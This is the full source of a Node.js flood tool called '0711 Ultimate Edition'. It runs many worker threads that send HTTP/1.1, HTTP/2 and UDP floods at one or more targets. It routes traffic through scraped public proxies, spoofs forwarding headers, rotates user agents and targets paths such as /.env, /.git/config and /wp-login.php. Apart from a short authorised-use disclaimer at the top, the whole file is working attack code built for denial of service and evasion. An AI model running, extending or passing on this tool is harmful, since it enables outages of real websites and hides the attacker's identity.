#!/usr/bin/env node
/**
 * =====================================================================
 *                         🔱 0711 – ULTIMATE EDITION 🔱
 *                 Multi‑Worker Layer7 & UDP Stress Tool
 *           Proxy Rotation, Rate‑Limit Bypass, Auto‑Heal,
 *           Multi‑Target, Real‑time Dashboard, Report Generator
 * =====================================================================
 * 
 * USAGE:
 *   node 0711.js --target example.com --port 443 --workers 50 --duration 120
 *   node 0711.js --targets targets.txt --proxy-auto --workers 100
 *   node 0711.js --target example.com --config config.json
 *   node 0711.js --example-config
 * 
 * ⚠️  WARNING: Use only on systems you own or have explicit permission.
 *     Unauthorized use is ILLEGAL and may result in criminal penalties.
 * =====================================================================
 */

// ===== Impor Modul =====
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');
const crypto = require('crypto');
const url = require('url');
const fs = require('fs');
const path = require('path');
const dns = require('dns').promises;
const http = require('http');
const https = require('https');
const net = require('net');
const tls = require('tls');
const readline = require('readline');
const util = require('util');

// ===== Konfigurasi Default =====
const CONFIG = {
    target: 'example.com',
    targets: [],
    ports: [443, 80],
    workersPerPort: 50,
    duration: 120,
    attackType: 'https',
    mode: 'normal',
    method: 'GET',
    proxyAuto: false,
    proxyFile: null,
    proxySources: [
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
        'https://www.proxy-list.download/api/v1/get?type=http',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
        'https://proxylist.rip/proxy/http/format/txt/',
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000',
        'https://www.proxy-list.download/api/v1/get?type=socks5',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
    ],
    userAgentsFile: null,
    payloadsFile: null,
    outputDir: './reports',
    dashboard: false,
    dashboardPort: 8080,
    logFile: '0711.log',
    verbose: false,
    maxConsecutiveFailures: 3,
    maxErrorsPerWorker: 1000,
    backoffBase: 1000,
    maxBackoff: 30000,
    customHeaders: {},
    sslVerify: false,
    payloads: [
        '/wp-admin', '/wp-login.php', '/wp-json/wp/v2/users', '/xmlrpc.php',
        '/api/v1/users', '/api/v1/login', '/api/v1/search',
        '/index.php', '/admin', '/login', '/dashboard', '/panel',
        '/config.php', '/.env', '/.git/config', '/backup.sql',
        '/phpinfo.php', '/server-status', '/.htaccess'
    ],
};

// ===== Utility =====
const logger = {
    _target: '',

    info: (msg) => console.log(`\x1b[36m[INFO]\x1b[0m ${msg}`),
    success: (msg) => console.log(`\x1b[32m[SUCCESS]\x1b[0m ${msg}`),
    warn: (msg) => console.log(`\x1b[33m[WARN]\x1b[0m ${msg}`),
    error: (msg) => console.log(`\x1b[31m[ERROR]\x1b[0m ${msg}`),
    debug: (msg) => { if (global.verbose) console.log(`\x1b[90m[DEBUG]\x1b[0m ${msg}`); },

    attack: (msg) => {
        const target = logger._target || 'UNKNOWN';
        console.log(`\x1b[35m[0711 ATTACK]\x1b[0m \x1b[33m(${target})\x1b[0m ${msg}`);
    },

    attackTime: (msg) => {
        const target = logger._target || 'UNKNOWN';
        const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
        console.log(`\x1b[35m[0711 ATTACK]\x1b[0m \x1b[33m(${target})\x1b[0m \x1b[90m[${time}]\x1b[0m ${msg}`);
    }
};

// ===== Spinner =====
class Spinner {
    constructor(text) {
        this.text = text;
        this.frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
        this.interval = null;
        this.current = 0;
    }
    start() {
        if (this.interval) return;
        this.interval = setInterval(() => {
            const frame = this.frames[this.current % this.frames.length];
            readline.cursorTo(process.stdout, 0);
            process.stdout.write(`\x1b[36m${frame}\x1b[0m ${this.text}`);
            this.current++;
        }, 80);
    }
    stop() {
        if (this.interval) {
            clearInterval(this.interval);
            this.interval = null;
            readline.cursorTo(process.stdout, 0);
            readline.clearLine(process.stdout, 0);
            process.stdout.write(`\x1b[32m✓\x1b[0m ${this.text}\n`);
        }
    }
}

// ===== Parser Argumen & Config =====
function parseArgs() {
    const args = process.argv.slice(2);
    const parsed = {};
    for (let i = 0; i < args.length; i++) {
        const arg = args[i];
        if (arg.startsWith('--')) {
            const key = arg.slice(2);
            const value = args[i+1] && !args[i+1].startsWith('--') ? args[i+1] : true;
            if (value !== true) i++;
            parsed[key] = value;
        }
    }
    return parsed;
}

function normalizeTarget(input) {
    if (!input) return input;
    let cleaned = input.trim();
    cleaned = cleaned.replace(/^https?:\/\//, '');
    cleaned = cleaned.replace(/\/$/, '');
    cleaned = cleaned.split(':')[0];
    return cleaned;
}

// ===== Fungsi Utama =====
async function main() {
    const cmdArgs = parseArgs();
    if (cmdArgs['example-config'] || cmdArgs['e']) {
        console.log(JSON.stringify(CONFIG, null, 2));
        return;
    }

    let config = { ...CONFIG };
    if (cmdArgs.config) {
        try {
            const fileConfig = JSON.parse(fs.readFileSync(cmdArgs.config, 'utf8'));
            config = { ...config, ...fileConfig };
        } catch (e) {
            logger.error(`Gagal load config file: ${e.message}`);
            process.exit(1);
        }
    }
    for (const [key, val] of Object.entries(cmdArgs)) {
        if (val !== undefined) config[key] = val;
    }

    if (config.target) {
        const original = config.target;
        config.target = normalizeTarget(config.target);
        if (original !== config.target) logger.debug(`Target normalized: ${original} -> ${config.target}`);
    }
    if (config.targets) {
        if (typeof config.targets === 'string') {
            if (fs.existsSync(config.targets)) {
                config.targets = fs.readFileSync(config.targets, 'utf8')
                    .split('\n')
                    .map(line => line.trim())
                    .filter(Boolean)
                    .map(normalizeTarget);
            } else {
                config.targets = [normalizeTarget(config.targets)];
            }
        } else if (Array.isArray(config.targets)) {
            config.targets = config.targets.map(normalizeTarget).filter(Boolean);
        }
    }
    if (!config.targets || config.targets.length === 0) {
        if (config.target) {
            config.targets = [config.target];
        } else {
            logger.error('Tidak ada target! Gunakan --target, --targets, atau --config');
            process.exit(1);
        }
    }

    logger._target = config.targets[0];

    if (typeof config.ports === 'string') {
        config.ports = config.ports.split(',').map(p => parseInt(p.trim()));
    } else if (!Array.isArray(config.ports)) {
        config.ports = [config.ports];
    }

    if (cmdArgs.workers) config.workersPerPort = parseInt(cmdArgs.workers);

    config.durationMs = config.duration > 0 ? config.duration * 1000 : null;

    let userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    ];
    if (config.userAgentsFile && fs.existsSync(config.userAgentsFile)) {
        try {
            const data = fs.readFileSync(config.userAgentsFile, 'utf8');
            userAgents = data.split('\n').map(l => l.trim()).filter(Boolean);
        } catch (e) {}
    }

    let payloadTemplates = config.payloads || [];
    if (config.payloadsFile && fs.existsSync(config.payloadsFile)) {
        try {
            const data = fs.readFileSync(config.payloadsFile, 'utf8');
            payloadTemplates = data.split('\n').map(l => l.trim()).filter(Boolean);
        } catch (e) {}
    }

    // ===== Proxy Manager =====
    let proxyList = [];
    const FALLBACK_PROXIES = [
        '103.250.3.60:3128', '103.174.178.38:3128', '103.87.56.129:3128',
        '103.94.160.141:8080', '103.94.160.142:8080', '103.94.160.143:8080',
        '103.94.160.144:8080', '103.94.160.145:8080', '103.94.160.146:8080',
    ];

    async function fetchProxies() {
        if (!config.proxyAuto && !config.proxyFile) {
            if (config.verbose) logger.debug('Proxy auto disabled and no proxy file.');
            return;
        }
        const spinner = new Spinner('Fetching proxies...');
        spinner.start();
        const all = new Set();

        if (config.proxyFile && fs.existsSync(config.proxyFile)) {
            const data = fs.readFileSync(config.proxyFile, 'utf8');
            data.split('\n').forEach(line => {
                const l = line.trim();
                if (l && !l.startsWith('#')) all.add(l);
            });
        }

        if (config.proxyAuto) {
            const sources = config.proxySources || CONFIG.proxySources;
            for (const src of sources) {
                try {
                    const urlObj = new URL(src);
                    const protocol = urlObj.protocol === 'https:' ? https : http;
                    const rawData = await new Promise((resolve, reject) => {
                        const req = protocol.get(urlObj, (res) => {
                            let data = '';
                            res.on('data', chunk => data += chunk);
                            res.on('end', () => resolve(data));
                            res.on('error', reject);
                        });
                        req.setTimeout(8000, () => {
                            req.destroy();
                            reject(new Error('Timeout'));
                        });
                        req.on('error', reject);
                    });
                    rawData.split('\n').forEach(line => {
                        const l = line.trim();
                        if (l && l.includes(':') && !l.startsWith('[') && !l.startsWith('#')) {
                            const [host, port] = l.split(':');
                            if (net.isIP(host) && port > 0 && port < 65536) {
                                all.add(l);
                            }
                        }
                    });
                } catch (e) {
                    if (config.verbose) logger.debug(`Failed ${src}: ${e.message}`);
                }
            }
        }

        if (all.size === 0) {
            logger.warn('No proxies fetched. Using fallback proxies.');
            for (const p of FALLBACK_PROXIES) all.add(p);
        }

        proxyList = Array.from(all);
        spinner.stop();
        if (proxyList.length > 0) {
            logger.success(`${proxyList.length} proxies ready.`);
        } else {
            logger.warn('No proxies available. Continuing without proxy.');
        }
    }

    // ===== Attack Engine =====
    class AttackEngine {
        constructor(config, userAgents, payloadTemplates, proxyList) {
            this.config = config;
            this.userAgents = userAgents;
            this.payloadTemplates = payloadTemplates;
            this.proxyList = proxyList;
            this.stats = {
                total: 0,
                success: 0,
                failed: 0,
                serverErrors: 0,
                startTime: Date.now(),
                activeWorkers: 0,
            };
            this.workers = [];
            this.isStopping = false;
            this.workerCounter = 0;
        }

        start(targets) {
            const totalWorkers = targets.length * this.config.ports.length * this.config.workersPerPort;
            logger.info(`Targets: ${targets.map(t => t.host).join(', ')}`);
            logger.info(`Ports: ${this.config.ports.join(', ')}`);
            logger.info(`Workers: ${this.config.workersPerPort} per port per target (total ${totalWorkers})`);
            logger.info(`Attack type: ${this.config.attackType}, Mode: ${this.config.mode}, Method: ${this.config.method}`);
            logger.info(`Duration: ${this.config.duration > 0 ? this.config.duration + 's' : 'Unlimited'}`);
            logger.info(`Proxy: ${this.proxyList.length > 0 ? 'Enabled ('+this.proxyList.length+' proxies)' : 'Disabled'}`);
            logger.info('');

            logger.attack(`ELMY0711 Attack is started`);

            const workerPromises = [];
            for (const target of targets) {
                for (const port of this.config.ports) {
                    for (let i = 0; i < this.config.workersPerPort; i++) {
                        const workerId = this.workerCounter++;
                        const workerData = {
                            targetIP: target.ip,
                            port: port,
                            attackType: this.config.attackType,
                            mode: this.config.mode,
                            durationMs: this.config.durationMs,
                            httpMethod: this.config.method,
                            workerId: `${target.host}-${port}-${workerId}`,
                            USER_AGENTS: this.userAgents,
                            CHARSET: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
                            proxyList: this.proxyList,
                            payloadTemplates: this.payloadTemplates,
                            maxConsecutiveFailures: this.config.maxConsecutiveFailures || 3,
                            maxErrorsPerWorker: this.config.maxErrorsPerWorker || 1000,
                            backoffBase: this.config.backoffBase || 1000,
                            maxBackoff: this.config.maxBackoff || 30000,
                            verbose: this.config.verbose || false,
                            customHeaders: this.config.customHeaders || {},
                        };

                        const worker = new Worker(WORKER_CODE, { eval: true, workerData });
                        this.workers.push(worker);

                        logger.attack(`Attack Thread ${workerId} Started`);

                        const promise = new Promise((resolve, reject) => {
                            worker.on('message', (msg) => {
                                if (msg.type === 'stats') {
                                    this.stats.total += msg.sent || 0;
                                    this.stats.success += msg.success || 0;
                                    this.stats.failed += msg.errors || 0;
                                    this.stats.serverErrors += msg.serverErrors || 0;
                                    this.stats.activeWorkers = msg.active || 0;
                                } else if (msg.type === 'done') {
                                    resolve({ workerId: msg.workerId, status: 'done' });
                                } else if (msg.type === 'log') {
                                    logger.attack(msg.message);
                                }
                            });
                            worker.on('error', (err) => {
                                this.stats.failed++;
                                logger.error(`Worker ${workerData.workerId} error: ${err.message}`);
                                reject({ workerId: workerData.workerId, status: 'error', error: err });
                            });
                            worker.on('exit', (code) => {
                                if (code !== 0 && !this.isStopping) {
                                    this.stats.failed++;
                                    logger.error(`Worker ${workerData.workerId} exited with code ${code}`);
                                    reject({ workerId: workerData.workerId, status: 'exit', code });
                                } else if (code === 0 && !this.isStopping) {
                                    resolve({ workerId: workerData.workerId, status: 'done' });
                                }
                            });
                        });
                        workerPromises.push(promise);
                    }
                }
            }

            // Stats printer (tanpa clear screen, tanpa banner)
            const statsInterval = setInterval(() => {
                const elapsed = (Date.now() - this.stats.startTime) / 1000;
                const rate = this.stats.total / (elapsed || 1);
                const successRate = this.stats.total > 0 ? ((this.stats.success / this.stats.total) * 100).toFixed(1) : 0;
                console.log(`\x1b[36m[STATS]\x1b[0m Total: ${this.stats.total} | Success: ${this.stats.success} | Failed: ${this.stats.failed} | ServerErr: ${this.stats.serverErrors} | Active: ${this.stats.activeWorkers} | Rate: ${rate.toFixed(1)} req/s | SuccessRate: ${successRate}% | Elapsed: ${elapsed.toFixed(1)}s`);
            }, 1000);

            // Interrupt handler
            const sigIntHandler = async () => {
                if (this.isStopping) return;
                this.isStopping = true;
                clearInterval(statsInterval);
                logger.warn('Stopping all workers...');
                for (const w of this.workers) {
                    try { w.postMessage({ type: 'stop' }); } catch (e) {}
                }
                await Promise.allSettled(workerPromises.map(p => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej('timeout'), 5000))])));
                logger.success('All workers stopped.');
                this.generateReport();
                process.exit(0);
            };
            process.on('SIGINT', sigIntHandler);

            // Wait for all workers
            Promise.allSettled(workerPromises)
                .then(() => {
                    clearInterval(statsInterval);
                    logger.success('All workers finished.');
                    this.generateReport();
                    process.exit(0);
                })
                .catch(() => {});
        }

        generateReport() {
            const elapsed = (Date.now() - this.stats.startTime) / 1000;
            const successRate = this.stats.total > 0 ? ((this.stats.success / this.stats.total) * 100).toFixed(2) : 0;
            const report = {
                timestamp: new Date().toISOString(),
                targets: this.config.targets,
                ports: this.config.ports,
                workers: this.config.workersPerPort,
                duration: elapsed,
                totalRequests: this.stats.total,
                success: this.stats.success,
                errors: this.stats.failed,
                serverErrors: this.stats.serverErrors,
                successRate: successRate + '%',
                proxyUsed: this.proxyList.length,
                attackType: this.config.attackType,
                mode: this.config.mode,
                method: this.config.method,
            };
            const outputDir = this.config.outputDir || './reports';
            if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true });
            const filename = path.join(outputDir, `report_${Date.now()}.json`);
            fs.writeFileSync(filename, JSON.stringify(report, null, 2));
            logger.success(`Report saved to ${filename}`);
            console.log('\x1b[36m══════════════════════════════════════════════════\x1b[0m');
            console.log('\x1b[36m╔══════════════════════════════════════════════════╗');
            console.log('\x1b[36m║              ATTACK FINISHED                    ║');
            console.log('\x1b[36m╚══════════════════════════════════════════════════╝');
            console.log(`Target(s)       : ${this.config.targets.join(', ')}`);
            console.log(`Total Requests  : ${this.stats.total}`);
            console.log(`Success (2xx-3xx): ${this.stats.success}`);
            console.log(`Errors          : ${this.stats.failed}`);
            console.log(`Server Errors   : ${this.stats.serverErrors}`);
            console.log(`Success Rate    : ${successRate}%`);
            console.log(`Duration        : ${elapsed.toFixed(2)}s`);
            console.log(`Proxy Used      : ${this.proxyList.length > 0 ? 'Yes ('+this.proxyList.length+')' : 'No'}`);
            console.log('\x1b[36m══════════════════════════════════════════════════\x1b[0m');
            if (this.config.logFile) {
                const logEntry = `[${new Date().toISOString()}] ${JSON.stringify(report)}\n`;
                fs.appendFileSync(this.config.logFile, logEntry);
            }
        }
    }

    // ===== Worker Code =====
    const WORKER_CODE = `
const { parentPort, workerData } = require('worker_threads');
const net = require('net');
const tls = require('tls');
const crypto = require('crypto');
const dgram = require('dgram');
const http2 = require('http2');
const http = require('http');

const {
    targetIP, port, attackType, mode, durationMs, httpMethod,
    workerId, USER_AGENTS, CHARSET, proxyList, payloadTemplates,
    maxConsecutiveFailures, maxErrorsPerWorker, backoffBase, maxBackoff, verbose, customHeaders,
} = workerData;

let sent = 0, active = 0, errors = 0, serverErrors = 0;
let isStopping = false;
let consecutiveFailures = 0;
let socket = null;
let durationTimer = null;
let currentProxyIndex = 0;

const localUA = USER_AGENTS || ['HydraWorker'];
const charset = CHARSET || 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

function rand(n) { return Math.floor(Math.random() * n); }
function randStr(len) { let s=''; for(let i=0;i<len;i++) s+=charset[rand(charset.length)]; return s; }
function randUA() { return localUA[rand(localUA.length)]; }
function randIP() { return \`\${rand(255)+1}.\${rand(255)+1}.\${rand(255)+1}.\${rand(255)+1}\`; }
function randPayload() { return payloadTemplates && payloadTemplates.length ? payloadTemplates[rand(payloadTemplates.length)] : '/'; }
function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }

function getProxy() {
    if (!proxyList || proxyList.length === 0) return null;
    const p = proxyList[currentProxyIndex % proxyList.length];
    currentProxyIndex++;
    return p;
}

function sendStats(extra = {}) {
    parentPort.postMessage({
        type: 'stats',
        sent: sent,
        active: active,
        errors: errors,
        serverErrors: serverErrors,
        success: sent - errors - serverErrors,
        ...extra,
    });
}

function sendLog(message) {
    parentPort.postMessage({ type: 'log', message: message });
}

function cleanup(reason) {
    if (isStopping) return;
    isStopping = true;
    if (durationTimer) { clearTimeout(durationTimer); durationTimer = null; }
    if (socket) { try { socket.destroy(); } catch(e) {} socket = null; }
    active = 0;
    sendStats({ workerId, reason });
    parentPort.postMessage({ type: 'done', workerId });
}

// --- Timer durasi ---
if (durationMs && durationMs > 0) {
    durationTimer = setTimeout(() => {
        cleanup('Duration limit reached');
    }, durationMs);
}

// --- HTTP/2 Attack ---
async function http2Attack() {
    let attempt = 0;
    while (!isStopping) {
        sent++; // SETIAP PERCOBAAN DIHITUNG

        // Batasi error
        if (errors > maxErrorsPerWorker) {
            cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
            return;
        }

        try {
            const proxy = getProxy();
            let tlsConn;
            if (proxy) {
                const [proxyHost, proxyPort] = proxy.split(':');
                const proxySocket = net.connect(proxyPort, proxyHost);
                proxySocket.write(\`CONNECT \${targetIP}:443 HTTP/1.1\\r\\nHost: \${targetIP}\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\`);
                await new Promise((resolve, reject) => {
                    proxySocket.once('data', (data) => {
                        if (data.toString().includes('200 Connection established')) {
                            resolve();
                        } else {
                            reject(new Error('Proxy CONNECT failed'));
                        }
                    });
                    proxySocket.once('error', reject);
                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);
                });
                tlsConn = tls.connect({
                    host: targetIP,
                    port: 443,
                    socket: proxySocket,
                    rejectUnauthorized: false,
                });
            } else {
                tlsConn = tls.connect({ host: targetIP, port: 443, rejectUnauthorized: false });
            }

            active = 1;
            sendStats();

            const client = http2.connect(\`https://\${targetIP}\`, { createConnection: () => tlsConn });
            client.on('error', (err) => {
                errors++;
                consecutiveFailures++;
                sendStats();
                client.destroy();
            });

            const payload = randPayload();
            const method = httpMethod || 'GET';
            const headers = {
                ':method': method,
                ':path': payload + '?' + randStr(12),
                ':scheme': 'https',
                ':authority': targetIP,
                'user-agent': randUA(),
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'x-forwarded-for': randIP(),
                'x-real-ip': randIP(),
                'referer': 'https://' + randStr(8) + '.com/',
            };
            if (customHeaders) {
                Object.assign(headers, customHeaders);
            }

            const req = client.request(headers);
            req.on('response', (response) => {
                consecutiveFailures = 0;
                // Tentukan status
                let status = response.headers[':status'] || 0;
                if (status >= 200 && status < 400) {
                    // success dihitung dari total - errors - serverErrors
                }
                sendStats();
                req.destroy();
                client.destroy();
            });
            req.on('error', (err) => {
                errors++;
                consecutiveFailures++;
                sendStats();
                req.destroy();
                client.destroy();
            });
            req.end();

            await sleep(10 + rand(20));

        } catch (err) {
            errors++;
            consecutiveFailures++;
            sendStats();
            if (consecutiveFailures >= maxConsecutiveFailures) {
                cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
                return;
            }
            await sleep(2000 + rand(3000));
        }
    }
}

// --- HTTP/1.1 Attack ---
async function httpAttack() {
    let attempt = 0;
    while (!isStopping) {
        sent++;
        if (errors > maxErrorsPerWorker) {
            cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
            return;
        }

        try {
            const proxy = getProxy();
            const options = {
                host: targetIP,
                port: port,
                method: httpMethod || 'GET',
                path: randPayload() + '?' + randStr(12),
                headers: {
                    'User-Agent': randUA(),
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'X-Forwarded-For': randIP(),
                    'X-Real-IP': randIP(),
                    'Referer': 'https://' + randStr(8) + '.com/',
                },
                rejectUnauthorized: false,
            };
            if (customHeaders) {
                Object.assign(options.headers, customHeaders);
            }

            const req = http.request(options);
            req.on('response', (response) => {
                consecutiveFailures = 0;
                sendStats();
                req.destroy();
            });
            req.on('error', (err) => {
                errors++;
                consecutiveFailures++;
                sendStats();
            });
            req.end();

            await sleep(10 + rand(20));

        } catch (err) {
            errors++;
            consecutiveFailures++;
            sendStats();
            if (consecutiveFailures >= maxConsecutiveFailures) {
                cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
                return;
            }
            await sleep(2000 + rand(3000));
        }
    }
}

// --- UDP Attack ---
async function udpAttack() {
    const udpSocket = dgram.createSocket('udp4');
    udpSocket.on('error', (err) => {
        errors++;
        sendStats();
    });
    udpSocket.on('message', () => { serverErrors++; sendStats(); });

    const startTime = Date.now();
    while (!isStopping) {
        sent++;
        if (errors > maxErrorsPerWorker) {
            cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
            return;
        }
        if (durationMs && Date.now() - startTime > durationMs) break;
        try {
            const payload = Buffer.from(randStr(500 + rand(500)));
            udpSocket.send(payload, port, targetIP, (err) => {
                if (err) { errors++; sendStats(); }
                else { sendStats(); }
            });
            await sleep(5 + rand(15));
        } catch (e) { errors++; sendStats(); }
    }
    udpSocket.close();
    cleanup('UDP finished');
}

// --- Timeout monitoring (log Request Timed Out) ---
let timeoutCounter = 0;
const timeoutInterval = setInterval(() => {
    if (isStopping) { clearInterval(timeoutInterval); return; }
    timeoutCounter++;
    if (timeoutCounter % 2 === 0) {
        sendLog('Request Timed Out');
    }
}, 2000);

parentPort.on('message', (msg) => {
    if (msg.type === 'stop') {
        clearInterval(timeoutInterval);
        cleanup('Received stop');
    }
});

// --- Start ---
if (attackType === 'udp') {
    udpAttack();
} else if (port === 443 || attackType === 'https') {
    http2Attack();
} else {
    httpAttack();
}
`;

    // ===== Eksekusi =====
    logger.info('Initializing 0711 Ultimate Edition...');

    if (config.proxyAuto || config.proxyFile) {
        await fetchProxies();
    }

    const targets = config.targets;
    let resolvedTargets = [];
    const spinner = new Spinner('Resolving targets...');
    spinner.start();
    for (const t of targets) {
        try {
            const ips = await dns.lookup(t, { all: true });
            const ip = ips.find(entry => entry.family === 4)?.address || t;
            resolvedTargets.push({ host: t, ip });
        } catch (e) {
            logger.warn(`Cannot resolve ${t}, using as-is.`);
            resolvedTargets.push({ host: t, ip: t });
        }
    }
    spinner.stop();
    logger.success(`Targets resolved: ${resolvedTargets.map(t => t.host).join(', ')}`);

    // Dashboard (optional)
    if (config.dashboard) {
        try {
            const express = require('express');
            const cors = require('cors');
            const app = express();
            app.use(cors());
            const engine = new AttackEngine(config, userAgents, payloadTemplates, proxyList);
            app.get('/stats', (req, res) => {
                res.json({
                    totalSent: engine.stats.total,
                    totalErrors: engine.stats.failed,
                    serverErrors: engine.stats.serverErrors,
                    activeWorkers: engine.stats.activeWorkers,
                    uptime: (Date.now() - engine.stats.startTime) / 1000,
                    targets: resolvedTargets.map(t => ({ host: t.host, status: 'running' })),
                });
            });
            app.listen(config.dashboardPort, () => {
                logger.success(`Dashboard running at http://localhost:${config.dashboardPort}/stats`);
            });
        } catch (e) {
            logger.warn('Dashboard dependencies not installed. Install express & cors.');
        }
    }

    const engine = new AttackEngine(config, userAgents, payloadTemplates, proxyList);
    engine.start(resolvedTargets);
}

if (require.main === module) {
    main().catch(err => {
        console.error('\x1b[31m[FATAL]\x1b[0m', err);
        process.exit(1);
    });
                }
